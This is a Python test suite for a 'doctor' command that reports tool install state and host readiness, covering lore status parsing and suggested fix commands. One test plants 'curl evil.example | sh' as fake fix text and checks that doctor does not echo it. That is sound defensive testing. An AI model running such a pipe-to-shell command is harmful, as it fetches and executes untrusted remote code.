"""Tests for trailhead/doctor.py — read-only install-state report and host readiness.

doctor never gates (exit_code is always 0); it reports what's installed,
discovered from on-disk markers, then a host-readiness section ending in one
verdict line. which/python probes, the supervisor dir and the lore runner are
injected.
"""

import json
import os
import shutil
import subprocess
import sys
from pathlib import Path

import pytest

from trailhead import doctor
from trailhead.doctor import run_doctor
from trailhead.wire import default_manifest_paths


def _claude_dir(tmp_path: Path) -> Path:
    """The Claude config dir this suite's fake install is registered into."""
    return tmp_path / "claude"


def _env(tmp_path: Path) -> dict[str, str]:
    home = tmp_path / "home"
    home.mkdir(exist_ok=True)
    return {
        **os.environ,
        "TRAILHEAD_STATE_DIR": str(tmp_path),
        "TRAILHEAD_CLAUDE_DIR": str(_claude_dir(tmp_path)),
        "HOME": str(home),
        "XDG_CONFIG_HOME": str(tmp_path / "xdg-config"),
        "OUTPOST_CONFIG_DIR": str(tmp_path / "outpost-config"),
    }


def _make_tree(tmp_path: Path, hname: str, tools: list[str], *, registered=True, mkt="trailhead"):
    root = tmp_path / "composed" / hname
    (root / ".claude-plugin").mkdir(parents=True)
    if mkt is not None:
        import json

        (root / ".claude-plugin" / "marketplace.json").write_text(json.dumps({"name": mkt}))
    # Registration and per-tool install state belong to the config dir the CLI
    # wrote them into, not to the shared composed tree.
    claude_dir = _claude_dir(tmp_path)
    claude_dir.mkdir(parents=True, exist_ok=True)
    if registered:
        (claude_dir / ".trailhead-registered").write_text("{}")
    for t in tools:
        (claude_dir / f".trailhead-installed-{t}").write_text("{}")


def _fake_py(cmd):
    return subprocess.CompletedProcess(cmd, 0, stdout="Python 3.11.4\n", stderr="")


class TestEmpty:
    def test_exit_zero_with_no_state(self, tmp_path):
        r = run_doctor(
            env=_env(tmp_path), which_runner=lambda n: None, python_version_runner=_fake_py
        )
        assert r.exit_code == 0
        assert r.data["harnesses"] == {}

    def test_human_output_mentions_no_harnesses(self, tmp_path):
        r = run_doctor(
            env=_env(tmp_path), which_runner=lambda n: None, python_version_runner=_fake_py
        )
        assert "no harnesses installed" in r.human_output


class TestReport:
    def test_reports_installed_tools(self, tmp_path):
        _make_tree(tmp_path, "claude_code", ["lore", "camp"])
        r = run_doctor(
            env=_env(tmp_path), which_runner=lambda n: None, python_version_runner=_fake_py
        )
        info = r.data["harnesses"]["claude_code"]
        assert info["registered"] is True
        assert set(info["installed"]) == {"lore", "camp"}
        assert info["marketplace"] == "trailhead"
        assert r.exit_code == 0

    def test_clis_reported_from_which(self, tmp_path):
        _make_tree(tmp_path, "claude_code", ["lore"])

        def which(n):
            return f"/shim/{n}" if n == "camp" else None

        r = run_doctor(env=_env(tmp_path), which_runner=which, python_version_runner=_fake_py)
        assert r.data["clis"]["camp"] == "/shim/camp"
        assert r.data["clis"]["lore"] is None

    def test_portage_cli_reported_from_which(self, tmp_path):
        # portage is CLI-bearing (its manifest declares cli_bin) just like
        # camp/lore, discovered generically rather than off a hardcoded list.
        r = run_doctor(
            env=_env(tmp_path),
            which_runner=lambda n: f"/shim/{n}" if n == "portage" else None,
            python_version_runner=_fake_py,
        )
        assert set(r.data["clis"]) == {"camp", "lore", "portage"}
        assert r.data["clis"]["portage"] == "/shim/portage"

    def test_python_version_reported(self, tmp_path):
        r = run_doctor(
            env=_env(tmp_path), which_runner=lambda n: None, python_version_runner=_fake_py
        )
        assert "3.11.4" in r.data["python3_version"]

    def test_exit_zero_even_when_cli_missing(self, tmp_path):
        # No pass/fail gating — a missing CLI on PATH is informational only.
        _make_tree(tmp_path, "claude_code", ["lore"])
        r = run_doctor(
            env=_env(tmp_path), which_runner=lambda n: None, python_version_runner=_fake_py
        )
        assert r.exit_code == 0

    def test_shim_dir_presence(self, tmp_path):
        (tmp_path / "bin").mkdir()
        r = run_doctor(
            env=_env(tmp_path), which_runner=lambda n: None, python_version_runner=_fake_py
        )
        assert r.data["shim_dir_present"] is True

    def test_unresolvable_harness_reports_empty_state(self, tmp_path):
        # A composed dir whose name isn't a registered Harness (e.g. leftover from
        # an uninstalled/renamed harness) must still be reported, not crash doctor.
        (tmp_path / "composed" / "not_a_real_harness").mkdir(parents=True)
        r = run_doctor(
            env=_env(tmp_path), which_runner=lambda n: None, python_version_runner=_fake_py
        )
        info = r.data["harnesses"]["not_a_real_harness"]
        assert info == {"registered": False, "installed": [], "marketplace": None}
        assert r.exit_code == 0


class TestMalformedManifest:
    def test_marketplace_none_when_malformed(self, tmp_path):
        root = tmp_path / "composed" / "claude_code"
        (root / ".claude-plugin").mkdir(parents=True)
        (root / ".claude-plugin" / "marketplace.json").write_text("{not json")
        r = run_doctor(
            env=_env(tmp_path), which_runner=lambda n: None, python_version_runner=_fake_py
        )
        assert r.data["harnesses"]["claude_code"]["marketplace"] is None

    def test_human_output_distinguishes_malformed_from_absent(self, tmp_path):
        root = tmp_path / "composed" / "claude_code"
        (root / ".claude-plugin").mkdir(parents=True)
        (root / ".claude-plugin" / "marketplace.json").write_text("{not json")
        _claude_dir(tmp_path).mkdir(parents=True, exist_ok=True)
        (_claude_dir(tmp_path) / ".trailhead-registered").write_text("{}")
        r = run_doctor(
            env=_env(tmp_path), which_runner=lambda n: None, python_version_runner=_fake_py
        )
        assert "marketplace: (unreadable)" in r.human_output
        assert "marketplace: (none)" not in r.human_output

    def test_human_output_reports_absent_when_no_manifest_file(self, tmp_path):
        _make_tree(tmp_path, "claude_code", [], mkt=None)
        r = run_doctor(
            env=_env(tmp_path), which_runner=lambda n: None, python_version_runner=_fake_py
        )
        assert "marketplace: (none)" in r.human_output
        assert "marketplace: (unreadable)" not in r.human_output


class TestBrokenCliManifest:
    def test_broken_manifest_does_not_crash_doctor(self, tmp_path):
        broken = tmp_path / "broken_capabilities.toml"
        broken.write_text("this is not valid toml [[[")
        manifest_paths = {
            "lore": default_manifest_paths()["lore"],
            "broken": broken,
        }
        r = run_doctor(
            env=_env(tmp_path),
            which_runner=lambda n: None,
            python_version_runner=_fake_py,
            manifest_paths=manifest_paths,
        )
        assert r.exit_code == 0
        assert "broken" not in r.data["clis"]

    def test_other_cli_bearing_tools_still_reported(self, tmp_path):
        broken = tmp_path / "broken_capabilities.toml"
        broken.write_text("this is not valid toml [[[")
        manifest_paths = {
            "lore": default_manifest_paths()["lore"],
            "broken": broken,
        }
        r = run_doctor(
            env=_env(tmp_path),
            which_runner=lambda n: None,
            python_version_runner=_fake_py,
            manifest_paths=manifest_paths,
        )
        assert "lore" in r.data["clis"]


class TestTrailheadField:
    """doctor reports a named top-level `trailhead` field (bare-name PATH
    resolution + checkout verification) — separate from the manifest-derived
    `clis` map, which never gets a trailhead entry."""

    def _repo_with_bin(self, tmp_path: Path) -> Path:
        repo = tmp_path / "repo"
        (repo / "trailhead").mkdir(parents=True)
        (repo / "trailhead" / "__init__.py").write_text("")
        (repo / "bin").mkdir()
        binpath = repo / "bin" / "trailhead"
        binpath.write_text("#!/usr/bin/env python3\n")
        binpath.chmod(0o755)
        return repo

    def test_checkout_present_when_repo_shaped_hit_has_executable_bin(self, tmp_path):
        repo = self._repo_with_bin(tmp_path)
        resolved = str(repo / "bin" / "trailhead")
        r = run_doctor(
            env=_env(tmp_path),
            which_runner=lambda n: resolved if n == "trailhead" else None,
            python_version_runner=_fake_py,
        )
        assert r.data["trailhead"]["path"] == resolved
        assert r.data["trailhead"]["checkout"] == str(repo)
        assert r.data["trailhead"]["checkout_present"] is True

    def test_checkout_missing_when_bin_trailhead_deleted(self, tmp_path):
        repo = self._repo_with_bin(tmp_path)
        resolved = str(repo / "bin" / "trailhead")
        (repo / "bin" / "trailhead").unlink()
        r = run_doctor(
            env=_env(tmp_path),
            which_runner=lambda n: resolved if n == "trailhead" else None,
            python_version_runner=_fake_py,
        )
        assert r.data["trailhead"]["checkout"] == str(repo)
        assert r.data["trailhead"]["checkout_present"] is False

    def test_checkout_missing_when_bin_trailhead_not_executable(self, tmp_path):
        repo = self._repo_with_bin(tmp_path)
        resolved = str(repo / "bin" / "trailhead")
        (repo / "bin" / "trailhead").chmod(0o644)
        r = run_doctor(
            env=_env(tmp_path),
            which_runner=lambda n: resolved if n == "trailhead" else None,
            python_version_runner=_fake_py,
        )
        assert r.data["trailhead"]["checkout_present"] is False

    def test_checkout_na_for_console_script_shaped_hit(self, tmp_path):
        venv = tmp_path / "venv" / "bin"
        venv.mkdir(parents=True)
        script = venv / "trailhead"
        script.write_text("#!/usr/bin/env python3\n")
        script.chmod(0o755)
        resolved = str(script)
        r = run_doctor(
            env=_env(tmp_path),
            which_runner=lambda n: resolved if n == "trailhead" else None,
            python_version_runner=_fake_py,
        )
        assert r.data["trailhead"]["path"] == resolved
        assert r.data["trailhead"]["checkout"] is None
        assert r.data["trailhead"]["checkout_present"] is None

    def test_checkout_na_when_repo_shaped_but_not_a_trailhead_checkout(self, tmp_path):
        # <parent.parent>/bin/trailhead exists but <parent.parent> has no
        # trailhead/__init__.py — the shape heuristic must not misfire.
        repo = tmp_path / "notrepo"
        (repo / "bin").mkdir(parents=True)
        binpath = repo / "bin" / "trailhead"
        binpath.write_text("#!/usr/bin/env python3\n")
        binpath.chmod(0o755)
        resolved = str(binpath)
        r = run_doctor(
            env=_env(tmp_path),
            which_runner=lambda n: resolved if n == "trailhead" else None,
            python_version_runner=_fake_py,
        )
        assert r.data["trailhead"]["checkout"] is None
        assert r.data["trailhead"]["checkout_present"] is None

    def test_null_resolved_path_reports_null_no_verdict(self, tmp_path):
        r = run_doctor(
            env=_env(tmp_path), which_runner=lambda n: None, python_version_runner=_fake_py
        )
        assert r.data["trailhead"]["path"] is None
        assert r.data["trailhead"]["checkout"] is None
        assert r.data["trailhead"]["checkout_present"] is None

    def test_null_resolved_path_human_copy_directs_to_command_v(self, tmp_path):
        r = run_doctor(
            env=_env(tmp_path), which_runner=lambda n: None, python_version_runner=_fake_py
        )
        assert "command -v trailhead" in r.human_output

    def test_human_output_has_trailhead_line_like_other_clis(self, tmp_path):
        repo = self._repo_with_bin(tmp_path)
        resolved = str(repo / "bin" / "trailhead")
        r = run_doctor(
            env=_env(tmp_path),
            which_runner=lambda n: resolved if n == "trailhead" else None,
            python_version_runner=_fake_py,
        )
        assert f"trailhead: {resolved}" in r.human_output

    def test_human_output_has_path_order_caveat(self, tmp_path):
        r = run_doctor(
            env=_env(tmp_path), which_runner=lambda n: None, python_version_runner=_fake_py
        )
        assert "shadow" in r.human_output.lower()

    def test_clis_map_has_no_trailhead_key(self, tmp_path):
        r = run_doctor(
            env=_env(tmp_path), which_runner=lambda n: None, python_version_runner=_fake_py
        )
        assert "trailhead" not in r.data["clis"]



class TestProvenance:
    def _checkout(self, tmp_path: Path) -> Path:
        checkout = tmp_path / "home" / "checkout"
        checkout.mkdir(parents=True, exist_ok=True)
        return checkout

    def test_reports_no_provenance_when_absent(self, tmp_path):
        r = run_doctor(
            env=_env(tmp_path), which_runner=lambda n: None, python_version_runner=_fake_py
        )
        assert r.data["provenance"] is None
        assert "no install provenance" in r.human_output.lower()

    def test_reports_the_stamp_when_present(self, tmp_path):
        from trailhead.provenance import write_stamp

        checkout = self._checkout(tmp_path)
        env = _env(tmp_path)

        def runner(args, **kw):
            sub = args[3]
            if sub == "rev-parse" and args[4] == "HEAD":
                return subprocess.CompletedProcess(args, 0, stdout="c" * 40 + "\n", stderr="")
            if sub == "rev-parse":
                return subprocess.CompletedProcess(args, 0, stdout="origin/main\n", stderr="")
            return subprocess.CompletedProcess(
                args, 0, stdout="https://example.com/r.git\n", stderr=""
            )

        write_stamp(checkout, env=env, runner=runner)

        r = run_doctor(env=env, which_runner=lambda n: None, python_version_runner=_fake_py)
        assert r.data["provenance"]["checkout"] == str(checkout)
        assert r.data["provenance"]["sha"] == "c" * 40
        assert str(checkout) in r.human_output

    def test_reports_last_check_outcome_when_present(self, tmp_path):
        from trailhead.provenance import record_check_outcome, write_stamp

        checkout = self._checkout(tmp_path)
        env = _env(tmp_path)

        def runner(args, **kw):
            sub = args[3]
            if sub == "rev-parse" and args[4] == "HEAD":
                return subprocess.CompletedProcess(args, 0, stdout="d" * 40 + "\n", stderr="")
            if sub == "rev-parse":
                return subprocess.CompletedProcess(args, 0, stdout="origin/main\n", stderr="")
            return subprocess.CompletedProcess(
                args, 0, stdout="https://example.com/r.git\n", stderr=""
            )

        write_stamp(checkout, env=env, runner=runner)
        record_check_outcome("unanswerable", reason="proxy blocked", env=env)

        r = run_doctor(env=env, which_runner=lambda n: None, python_version_runner=_fake_py)
        assert r.data["provenance"]["last_check"]["outcome"] == "unanswerable"
        assert "unanswerable" in r.human_output.lower()

    def test_says_so_plainly_when_no_check_has_run_yet(self, tmp_path):
        from trailhead.provenance import write_stamp

        checkout = self._checkout(tmp_path)
        env = _env(tmp_path)

        def runner(args, **kw):
            sub = args[3]
            if sub == "rev-parse" and args[4] == "HEAD":
                return subprocess.CompletedProcess(args, 0, stdout="e" * 40 + "\n", stderr="")
            if sub == "rev-parse":
                return subprocess.CompletedProcess(args, 0, stdout="origin/main\n", stderr="")
            return subprocess.CompletedProcess(
                args, 0, stdout="https://example.com/r.git\n", stderr=""
            )

        write_stamp(checkout, env=env, runner=runner)

        r = run_doctor(env=env, which_runner=lambda n: None, python_version_runner=_fake_py)
        assert r.data["provenance"]["last_check"] is None
        assert "no update check" in r.human_output.lower() or "never checked" in r.human_output.lower()

    def test_reports_a_rejected_stamp_distinctly_from_an_absent_one(self, tmp_path):
        from trailhead import provenance

        env = _env(tmp_path)
        checkout = self._checkout(tmp_path)
        rejected_stamp = {
            "checkout": str(checkout),
            "sha": "not-a-real-sha",
            "wired_at": "2026-01-01T00:00:00Z",
            "last_check": None,
        }
        provenance._atomic_write_json(provenance.stamp_path(env=env), rejected_stamp)

        r = run_doctor(env=env, which_runner=lambda n: None, python_version_runner=_fake_py)
        assert r.data["provenance"] is None
        assert "no install provenance recorded" not in r.human_output.lower()
        assert "rejected" in r.human_output.lower()


# ---------------------------------------------------------------------------
# host readiness
# ---------------------------------------------------------------------------

_LORE_OK_ITEMS = [
    {"id": "signing", "state": "ok", "summary": "this host signs unattended"},
    {"id": "vault:default", "state": "ok", "summary": "vault default is synced"},
    {"id": "forge:default", "state": "ok", "summary": "vault default: remote reachable"},
    {"id": "author", "state": "ok", "summary": "this host makes vault content", "detail": "yes"},
]

_VERDICT_READY = "HOST READY"


def _lore_stdout(items, schema=1) -> str:
    return json.dumps({"schema": schema, "items": items})


def _lore_runner(stdout="", *, rc=0, raises=None, calls=None):
    def run(argv, timeout):
        if calls is not None:
            calls.append((list(argv), timeout))
        if raises is not None:
            raise raises
        return subprocess.CompletedProcess(argv, rc, stdout=stdout, stderr="")

    return run


def _prepare_host(tmp_path: Path, *, outpost=True, built=True, supervisor=True) -> dict:
    """A host with Outpost checked out and built and the supervisor entry present."""
    env = _env(tmp_path)
    checkout = tmp_path / "outpost-checkout"
    checkout.mkdir()
    if built:
        entry = checkout / "dist" / "server" / "index.js"
        entry.parent.mkdir(parents=True)
        entry.write_text("// built\n")
    if outpost:
        cfg = Path(env["OUTPOST_CONFIG_DIR"])
        cfg.mkdir(parents=True)
        (cfg / "config.toml").write_text(f'checkout = "{checkout}"\n')
    sup = tmp_path / "supervisor"
    sup.mkdir()
    if supervisor:
        (sup / "outpost.service").write_text("[Unit]\n")
    return env


def _host_doctor(env, tmp_path: Path, *, lore=None, platform="linux"):
    """Run doctor against a host under *tmp_path*; lore reports every item ok unless *lore* is given."""
    return run_doctor(
        env=env,
        which_runner=lambda n: None,
        python_version_runner=_fake_py,
        supervisor_dir=tmp_path / "supervisor",
        platform=platform,
        lore_runner=lore if lore is not None else _lore_runner(_lore_stdout(_LORE_OK_ITEMS)),
    )


def _doctor(tmp_path, lore_items=_LORE_OK_ITEMS, *, lore=None, **host):
    env = _prepare_host(tmp_path, **host)
    return _host_doctor(env, tmp_path, lore=lore if lore is not None else _lore_runner(_lore_stdout(lore_items)))


def _item(result, item_id: str) -> dict:
    return next(i for i in result.data["readiness"]["items"] if i["id"] == item_id)


def _readiness_lines(human: str) -> list[str]:
    lines = human.splitlines()
    start = next(i for i, ln in enumerate(lines) if ln.strip().startswith("host readiness"))
    return lines[start:]


def _item_block(human: str, item_id: str) -> str:
    """The item's line plus its indented continuation lines."""
    lines = _readiness_lines(human)
    for i, ln in enumerate(lines):
        if f" {item_id}:" in ln:
            block = [ln]
            for nxt in lines[i + 1 :]:
                if nxt.startswith("      "):
                    block.append(nxt)
                else:
                    break
            return "\n".join(block)
    raise AssertionError(f"no line for {item_id} in:\n{human}")


def _states(result) -> dict[str, str]:
    return {i["id"]: i["state"] for i in result.data["readiness"]["items"]}


class TestReadinessAllPresent:
    def test_every_line_ok_and_ready(self, tmp_path):
        r = _doctor(tmp_path)
        assert _states(r) == {
            "outpost": "ok",
            "supervisor": "ok",
            "signing": "ok",
            "vault:default": "ok",
            "forge:default": "ok",
            "author": "ok",
        }
        assert r.data["readiness"]["verdict"] == _VERDICT_READY
        assert _readiness_lines(r.human_output)[-1].strip() == _VERDICT_READY
        assert r.exit_code == 0

    def test_exactly_one_verdict_line(self, tmp_path):
        r = _doctor(tmp_path)
        verdicts = [ln for ln in r.human_output.splitlines() if ln.strip().startswith("HOST ")]
        assert len(verdicts) == 1

    def test_lines_follow_install_step_order(self, tmp_path):
        r = _doctor(tmp_path)
        ids = [i["id"] for i in r.data["readiness"]["items"]]
        assert ids == ["forge:default", "outpost", "vault:default", "signing", "author", "supervisor"]

    def test_forge_ok_names_the_limit_of_the_check(self, tmp_path):
        r = _doctor(tmp_path)
        block = _item_block(r.human_output, "forge:default")
        assert "reachable from this shell (the background service's access is not checked)" in block

    def test_lore_is_asked_for_json_status_under_a_30s_timeout(self, tmp_path):
        calls = []
        _doctor(tmp_path, lore=_lore_runner(_lore_stdout(_LORE_OK_ITEMS), calls=calls))
        assert calls == [(["lore", "status", "--json"], 30)]


_ONE_MISSING = [
    pytest.param(
        {"outpost": False},
        "outpost",
        "gh repo clone trailhead-ai/outpost",
        doctor.STEP_OUTPOST,
        id="outpost-config-absent",
    ),
    pytest.param(
        {"built": False},
        "outpost",
        "npm run build",
        doctor.STEP_OUTPOST,
        id="outpost-not-built",
    ),
    pytest.param(
        {"supervisor": False},
        "supervisor",
        "trailhead outpost enable",
        doctor.STEP_SUPERVISOR,
        id="supervisor-absent",
    ),
    pytest.param(
        {"signing": "missing"},
        "signing",
        "lore signing enable",
        doctor.STEP_SIGNING,
        id="signing-missing",
    ),
    pytest.param(
        {"author": "missing"},
        "author",
        "lore vault config --makes-vault-content yes",
        doctor.STEP_AUTHOR,
        id="author-undeclared",
    ),
]


class TestReadinessOneMissing:
    @pytest.fixture
    def run_case(self, tmp_path):
        def go(case):
            host = {k: v for k, v in case.items() if k in ("outpost", "built", "supervisor")}
            items = [dict(i) for i in _LORE_OK_ITEMS]
            for key in ("signing", "author"):
                if key in case:
                    target = next(i for i in items if i["id"] == key)
                    target["state"] = case[key]
                    if key == "author":
                        target["detail"] = "undeclared"
            return _doctor(tmp_path, items, **host)

        return go

    @pytest.mark.parametrize("case,item_id,fix,step", _ONE_MISSING)
    def test_line_names_the_item_as_missing(self, run_case, case, item_id, fix, step):
        r = run_case(case)
        assert f"[missing] {item_id}:" in _item_block(r.human_output, item_id)
        assert _states(r)[item_id] == "missing"

    @pytest.mark.parametrize("case,item_id,fix,step", _ONE_MISSING)
    def test_line_carries_the_fix_command(self, run_case, case, item_id, fix, step):
        r = run_case(case)
        assert fix in _item_block(r.human_output, item_id)

    @pytest.mark.parametrize("case,item_id,fix,step", _ONE_MISSING)
    def test_line_carries_the_install_step_number(self, run_case, case, item_id, fix, step):
        r = run_case(case)
        assert f"INSTALL.md step {step}" in _item_block(r.human_output, item_id)

    @pytest.mark.parametrize("case,item_id,fix,step", _ONE_MISSING)
    def test_verdict_counts_exactly_one_missing_in_human_and_json(
        self, run_case, case, item_id, fix, step
    ):
        r = run_case(case)
        expected = "HOST NOT READY: 1 missing, 0 could not be checked"
        assert _readiness_lines(r.human_output)[-1].strip() == expected
        assert r.data["readiness"]["verdict"] == expected
        assert r.exit_code == 0

    @pytest.mark.parametrize("case,item_id,fix,step", _ONE_MISSING)
    def test_json_item_carries_fix_and_step(self, run_case, case, item_id, fix, step):
        r = run_case(case)
        item = _item(r, item_id)
        assert fix in item["fix"]
        assert item["step"] == step


class TestFixLine:
    @pytest.mark.parametrize("case,item_id,fix,step", _ONE_MISSING)
    def test_the_fix_line_holds_only_the_command(self, tmp_path, case, item_id, fix, step):
        host = {k: v for k, v in case.items() if k in ("outpost", "built", "supervisor")}
        items = [dict(i) for i in _LORE_OK_ITEMS]
        for key in ("signing", "author"):
            if key in case:
                next(i for i in items if i["id"] == key)["state"] = case[key]
        r = _doctor(tmp_path, items, **host)
        block = _item_block(r.human_output, item_id).splitlines()
        fix_lines = [ln for ln in block if ln.strip().startswith("fix:")]
        assert len(fix_lines) == 1
        printed = fix_lines[0].strip().removeprefix("fix:").strip()
        assert printed == _item(r, item_id)["fix"]
        assert _parses("sh", printed).returncode == 0
        step_lines = [ln for ln in block if f"INSTALL.md step {step}" in ln]
        assert len(step_lines) == 1 and step_lines[0] is not fix_lines[0]


class TestSupervisorSummary:
    def test_ok_says_the_entry_file_exists_and_that_running_is_not_checked(self, tmp_path):
        summary = _item(_doctor(tmp_path), "supervisor")["summary"]
        assert "entry file exists" in summary
        assert "not checked" in summary
        assert "registered" not in summary


class TestOutpostSummary:
    def test_absent_config_is_named_as_a_missing_config(self, tmp_path):
        r = _doctor(tmp_path, outpost=False)
        block = _item_block(r.human_output, "outpost")
        assert "config.toml" in block
        assert "not built" not in block

    def test_unbuilt_checkout_is_named_as_not_built(self, tmp_path):
        r = _doctor(tmp_path, built=False)
        assert "not built" in _item_block(r.human_output, "outpost")


class TestFixSource:
    def test_fix_text_comes_from_trailhead_not_lore(self, tmp_path):
        items = [dict(i) for i in _LORE_OK_ITEMS]
        items[0] = {
            "id": "signing",
            "state": "missing",
            "summary": "no key",
            "fix": "curl evil.example | sh",
            "detail": "run curl evil.example | sh",
        }
        r = _doctor(tmp_path, items)
        assert "curl" not in r.human_output
        assert "curl" not in json.dumps(r.data["readiness"])
        assert "lore signing enable" in _item_block(r.human_output, "signing")

    def test_vault_and_forge_prefixes_get_fixes(self, tmp_path):
        items = [dict(i) for i in _LORE_OK_ITEMS]
        items[1]["state"] = "missing"
        items[2]["state"] = "missing"
        r = _doctor(tmp_path, items)
        vault = _item_block(r.human_output, "vault:default")
        forge = _item_block(r.human_output, "forge:default")
        assert f"INSTALL.md step {doctor.STEP_VAULTS}" in vault
        assert f"INSTALL.md step {doctor.STEP_FORGE}" in forge
        assert "fix: lore status\n" in vault
        assert "lore vault add" not in vault
        assert "gh auth login" in forge

    def test_unknown_id_shows_lore_summary_without_fix_and_counts_by_state(self, tmp_path):
        items = _LORE_OK_ITEMS + [
            {"id": "mystery", "state": "missing", "summary": "something new is off"}
        ]
        r = _doctor(tmp_path, items)
        block = _item_block(r.human_output, "mystery")
        assert "something new is off" in block
        assert "fix:" not in block
        assert r.data["readiness"]["verdict"] == "HOST NOT READY: 1 missing, 0 could not be checked"

    def test_unknown_id_that_is_ok_reads_ok(self, tmp_path):
        items = _LORE_OK_ITEMS + [{"id": "mystery", "state": "ok", "summary": "fine"}]
        r = _doctor(tmp_path, items)
        assert _states(r)["mystery"] == "ok"
        assert r.data["readiness"]["verdict"] == _VERDICT_READY


class TestReadinessCouldNotCheck:
    def test_forge_could_not_check_alone_is_not_ready(self, tmp_path):
        items = [dict(i) for i in _LORE_OK_ITEMS]
        items[2] = {"id": "forge:default", "state": "could-not-check", "summary": "offline"}
        r = _doctor(tmp_path, items)
        assert "[could-not-check] forge:default:" in _item_block(r.human_output, "forge:default")
        expected = "HOST NOT READY: 0 missing, 1 could not be checked"
        assert r.data["readiness"]["verdict"] == expected
        assert _readiness_lines(r.human_output)[-1].strip() == expected
        assert r.exit_code == 0


_LORE_FAILURES = [
    pytest.param(_lore_runner(raises=FileNotFoundError("lore")), id="absent"),
    pytest.param(
        _lore_runner(raises=subprocess.TimeoutExpired(["lore"], 30)), id="timeout"
    ),
    pytest.param(_lore_runner("", rc=1), id="exit-1"),
    pytest.param(_lore_runner(_lore_stdout(_LORE_OK_ITEMS), rc=1), id="exit-1-with-valid-json"),
    pytest.param(_lore_runner("not json at all"), id="non-json"),
    pytest.param(_lore_runner(_lore_stdout(_LORE_OK_ITEMS, schema=2)), id="schema-2"),
    pytest.param(
        _lore_runner(_lore_stdout([{"id": "signing", "summary": "x"}])), id="item-without-state"
    ),
    pytest.param(
        _lore_runner(_lore_stdout([{"state": "ok", "summary": "x"}])), id="item-without-id"
    ),
    pytest.param(
        _lore_runner(_lore_stdout([{"id": "signing", "state": "fine", "summary": "x"}])),
        id="unknown-state",
    ),
    pytest.param(_lore_runner("[]"), id="not-an-object"),
]


class TestLoreCallFails:
    @pytest.mark.parametrize("lore", _LORE_FAILURES)
    def test_reads_could_not_check_naming_lore(self, tmp_path, lore):
        r = _doctor(tmp_path, lore=lore)
        assert _states(r)["lore"] == "could-not-check"
        assert "lore" in _item_block(r.human_output, "lore").lower()

    @pytest.mark.parametrize("lore", _LORE_FAILURES)
    def test_no_lore_owned_item_reads_ok(self, tmp_path, lore):
        r = _doctor(tmp_path, lore=lore)
        lore_owned = {"signing", "author", "vault:default", "forge:default"}
        assert not lore_owned & set(_states(r))

    @pytest.mark.parametrize("lore", _LORE_FAILURES)
    def test_verdict_is_not_ready_and_exit_is_zero(self, tmp_path, lore):
        r = _doctor(tmp_path, lore=lore)
        expected = "HOST NOT READY: 0 missing, 1 could not be checked"
        assert r.data["readiness"]["verdict"] == expected
        assert _readiness_lines(r.human_output)[-1].strip() == expected
        assert r.exit_code == 0

    def test_exit_2_says_to_update_lore(self, tmp_path):
        r = _doctor(tmp_path, lore=_lore_runner("", rc=2))
        block = _item_block(r.human_output, "lore")
        assert "update lore" in block.lower()

    def test_absent_lore_says_it_is_not_on_path(self, tmp_path):
        r = _doctor(tmp_path, lore=_lore_runner(raises=FileNotFoundError("lore")))
        assert "not on PATH" in _item_block(r.human_output, "lore")

    def test_exit_1_does_not_say_to_update_lore(self, tmp_path):
        r = _doctor(tmp_path, lore=_lore_runner("", rc=1))
        assert "update lore" not in _item_block(r.human_output, "lore").lower()

    def test_a_failed_lore_does_not_hide_trailhead_owned_items(self, tmp_path):
        r = _doctor(tmp_path, lore=_lore_runner("", rc=1), supervisor=False)
        assert _states(r)["supervisor"] == "missing"
        assert r.data["readiness"]["verdict"] == "HOST NOT READY: 1 missing, 1 could not be checked"


class TestReadinessJson:
    def test_json_carries_verdict_and_items_and_keeps_existing_keys(self, tmp_path):
        r = _doctor(tmp_path)
        readiness = r.data["readiness"]
        assert readiness["verdict"] == _VERDICT_READY
        assert {i["id"] for i in readiness["items"]} >= {"outpost", "supervisor", "signing"}
        for key in ("harnesses", "shim_dir", "clis", "trailhead", "python3_version", "provenance"):
            assert key in r.data
        json.dumps(r.data)

    def test_exit_is_zero_when_everything_is_missing(self, tmp_path):
        r = _doctor(
            tmp_path,
            [{"id": "signing", "state": "missing", "summary": "no key"}],
            outpost=False,
            supervisor=False,
        )
        assert r.exit_code == 0
        assert r.data["readiness"]["verdict"].startswith("HOST NOT READY: 3 missing")

    def test_supervisor_on_unsupported_platform_could_not_be_checked(self, tmp_path):
        r = _host_doctor(_prepare_host(tmp_path), tmp_path, platform="win32")
        assert _states(r)["supervisor"] == "could-not-check"


class TestLoreSeam:
    """The real lore item builder's JSON, through doctor's parser."""

    def test_every_real_item_maps_to_a_known_id_with_a_fix(self, tmp_path, monkeypatch):
        lore_plugin = Path(__file__).resolve().parents[2] / "tools/lore/plugins/lore"
        monkeypatch.syspath_prepend(str(lore_plugin))
        for name in [m for m in sys.modules if m == "lore" or m.startswith("lore.")]:
            monkeypatch.delitem(sys.modules, name)
        from lore.cli import readiness

        home = tmp_path / "seam-home"
        vault = tmp_path / "seam-vault"
        vault.mkdir()
        subprocess.run(["git", "-C", str(vault), "init", "-q"], check=True)
        subprocess.run(
            ["git", "-C", str(vault), "remote", "add", "origin", "https://example.invalid/t/v.git"],
            check=True,
        )
        cfg = tmp_path / "seam-config" / "lore"
        cfg.mkdir(parents=True)
        (cfg / "config.json").write_text(
            json.dumps({"vaults": [{"name": "default", "scope": "default", "path": str(vault)}]})
        )
        home.mkdir()
        monkeypatch.setenv("HOME", str(home))
        monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "seam-config"))
        monkeypatch.setenv("XDG_STATE_HOME", str(tmp_path / "seam-state"))
        monkeypatch.delenv("LORE_STATE_DIR", raising=False)

        items = readiness.build_readiness_items(
            dict(os.environ), probe_runner=lambda argv, env, timeout: (128, "permission denied (publickey)")
        )
        parsed = doctor.parse_lore_status(readiness.render_json(items))

        ids = [i["id"] for i in parsed]
        assert {"signing", "author", "vault:default", "forge:default"} <= set(ids)
        for item in parsed:
            assert doctor.fix_for(item["id"]) is not None, item["id"]

    def test_parser_returns_the_items_of_a_valid_report(self):
        parsed = doctor.parse_lore_status(_lore_stdout(_LORE_OK_ITEMS))
        assert [i["id"] for i in parsed] == [i["id"] for i in _LORE_OK_ITEMS]

    def test_parser_refuses_an_unknown_schema(self):
        with pytest.raises(doctor.LoreStatusError):
            doctor.parse_lore_status(_lore_stdout(_LORE_OK_ITEMS, schema=2))


class _OutpostSandbox:
    """A host whose HOME, config dir and PATH (stub gh, npm, editor) all live under tmp."""

    def __init__(self, tmp_path: Path):
        self.tmp = tmp_path
        self.env = _env(tmp_path)
        self.home = Path(self.env["HOME"])
        self.cfg_dir = Path(self.env["OUTPOST_CONFIG_DIR"])
        self.cfg = self.cfg_dir / "config.toml"
